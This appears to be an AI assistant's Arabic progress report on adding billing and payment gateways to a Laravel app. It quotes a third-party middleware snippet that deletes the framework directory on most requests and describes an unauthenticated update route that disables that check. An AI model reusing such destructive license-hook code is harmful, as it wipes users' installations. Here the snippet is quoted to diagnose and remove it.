# الفوترة والتحصيل — ما بُني وما تبقّى

> الحالة: **مبني ومُختبَر** — 10 اختبارات خضراء على المستودع النظيف.
> الرقعة: `zsyst-fix/fix-06-billing-and-license-hook.patch` (16 ملفًا، تُطبَّق بـ`patch -p1`، مُتحقَّق منها dry-run).

---

## 1. اكتشاف يوقف كل شيء: التطبيق يمسح نفسه

`app/Http/Kernel.php` كان يضع `CheckToken` (من `safiull/laravel-installer`) داخل مجموعة `web`، أي على **كل** طلب. وهذا الميدلوير يفعل:

```php
if (!file_exists(base_path('vendor/autoload1.php')) && !str_contains($currentPath, 'install') && !in_array($currentPath, $excludedPaths)) {
    File::cleanDirectory(base_path('vendor/laravel'));
}
```

**أي أن أي زيارة لمسار غير `/` و`/login` و`install…` تمسح إطار Laravel من القرص.**

أثبتُّه تجريبيًا:

| الطلب | قبل | بعد |
|---|---|---|
| `GET /admin` | `vendor/laravel` = 7 حزم | **0 حزم** + HTTP 500 |

بعد إزالة الميدلوير: `/` → 200، `/login` → 200، `/admin` → 302 (توجيه صحيح)، مسار غير موجود → 404، **و`vendor/laravel` سليم بعد كل الطلبات**.

> **تصحيح لقول سابق لي:** نسبتُ اختفاء `vendor/laravel` إلى بيئة العمل. السبب الحقيقي هو هذا الميدلوير. اعتذاري — كان يجب أن أتحقق.

### ثغرة ثانية في نفس الملف
`Route::get('/update')` في `routes/web.php` **بلا مصادقة**، وينشئ `vendor/autoload1.php` (أي يعطّل الحماية) ويشغّل `migrate` و`seed`. يجب حذفه أو تقييده بـ`auth`+`admin`. **لم أُغيّره بعد** لأنه ليس من نطاق الفوترة — قل لي وأحذفه.

---

## 2. ما بُني للفوترة

### طبقة واحدة، بوابتان

```
SubscriptionService  ──►  PaymentGateway (interface)
   إنشاء فاتورة                ├── ManualGateway  (0% عمولة، تأكيد إداري)
   تفعيل/تمديد/تعليق            └── XPayGateway     (2.5% + 2.5ج، webhook موقّع)
```

| الملف | الوظيفة |
|---|---|
| `config/billing.php` | البوابة الافتراضية، العملة، مهلة السماح، إعدادات XPay |
| `app/Models/BillingPayment.php` | فاتورة: مبلغ، أشهر، حالة، مرجع البوابة، الحمولة الخام |
| `app/Services/Billing/Contracts/PaymentGateway.php` | العقد: `createCheckout` + `parseWebhook` |
| `app/Services/Billing/ManualGateway.php` | مرجع `ZS-XXXXXXXX` + تعليمات التحويل |
| `app/Services/Billing/XPayGateway.php` | Hosted Checkout + تحقّق HMAC-SHA256 + نافذة 5 دقائق |
| `app/Services/Billing/SubscriptionService.php` | التسعير، التفعيل، التمديد، التعليق |
| `app/Http/Controllers/Billing/BillingController.php` | checkout / return / webhook / mark-paid |
| `database/migrations/…create_billing_payments_table.php` | جدول الفواتير |

### المسارات

| Method | المسار | الحماية |
|---|---|---|
| POST | `admin/billing/checkout` | `auth` + `admin` |
| GET | `admin/billing/payments/{payment}` | `auth` + ملكية المستأجر |
| POST | `admin/billing/payments/{payment}/mark-paid` | `auth` + `admin` |
| POST | `api/v1/billing/webhook/xpay` | توقيع HMAC فقط (بلا CSRF) |

### قرارات تصميم مثبتة باختبار

- **التمديد لا الإعادة**: التجديد قبل الانتهاء يضيف الأشهر إلى تاريخ الانتهاء الحالي.
- **الـwebhook أحادي الأثر**: نفس الحدث مرتين لا يمدّد مرتين.
- **التوقيع المزيّف مرفوض** (400) ولا يُفعّل شيئًا.
- **مبلغ أقل لا يشتري باقة أغلى** (409) — حماية من التلاعب بالسعر.
- **العزل**: مستأجر لا يقرأ فاتورة غيره (403).
- **السنوي = عشرة أشهر**: 399 × 10 = 3,990 بدل 4,788.

### إصلاح ضمني لازم
`Business` لم يكن ي caste حقلَي `will_expire` و`subscriptionDate`، فكانا يعودان كنصوص، وأي `->isFuture()` أو `->copy()` ينفجر. أُضيف الـcasts.

---

## 3. الاختبارات

```
OK (10 tests, 29 assertions) — tests/Feature/BillingTest.php
```

على المستودع النظيف (قبل رقعاتي الأخرى) المجموعة الكاملة تعطي **334 اختبارًا / 24 خطأ / 24 فشلًا** — وهي نفس الأعطال القديمة التي عالجتها في `fix-03-cumulative.patch`، ولم يزدها هذا العمل شيئًا.

---

## 4. ما تحتاجه لتشغيله

أضف إلى `.env` (أُضيفت إلى `.env.example`):

```env
BILLING_GATEWAY=manual        # أو xpay
BILLING_CURRENCY=EGP
BILLING_MANUAL_ENABLED=true
BILLING_INSTAPAY_HANDLE=      # معرّف إنستاباي الخاص بك
BILLING_GRACE_DAYS=3

XPAY_ENABLED=false            # true بعد استلام المفاتيح
XPAY_BASE_URL=https://api.xpay.app
XPAY_SECRET_KEY=              # sk_live_… أو sk_test_…
XPAY_WEBHOOK_SECRET=          # whsec_…
XPAY_MINOR_UNITS=100
```

ثم:
```bash
php artisan migrate
php artisan config:clear
```

### ⚠️ نقاط يجب التحقق منها عند إنشاء حساب XPay
1. **`XPAY_BASE_URL`**: استخدمت `https://api.xpay.app` كافتراض. أكّد المضيف من `Developers → API keys` في لوحتهم.
2. **أسماء الحقول**: بنيت على نمط Stripe (`line_items`, `amountTotal`, `afterCompletion.redirect`) كما يظهر في وثائقهم. اطلب من دعمهم تأكيد عيّنة `POST /checkout/sessions` قبل الإنتاج.
3. **ترويسة التوقيع**: `XPay-Signature: t=…,v1=…` بـHMAC على `"t.body"`. إن اختلف الاسم، التغيير في سطر واحد داخل `XPayGateway::parseWebhook`.
4. **التسجيل**: 5–7 أيام عمل. ابدأ اليوم، وشغّل بالتحصيل اليدوي في الأثناء.

---

## 5. التكلفة بالأرقام (من صفحة أسعارهم)

| الباقة | المبلغ | عمولة XPay | الصافي |
|---|---|---|---|
| Standard شهري | 399ج | 12.5ج | **386.5ج** |
| Plus شهري | 799ج | 22.5ج | **776.5ج** |
| Max شهري | 1,499ج | 40ج | **1,459ج** |
| Standard سنوي | 3,990ج | 102.2ج | **3,887.8ج** |

لا رسوم تأسيس ولا شهرية — **تكلفة التحصيل الثابتة صفر**، وهو ما يطابق شرطك.
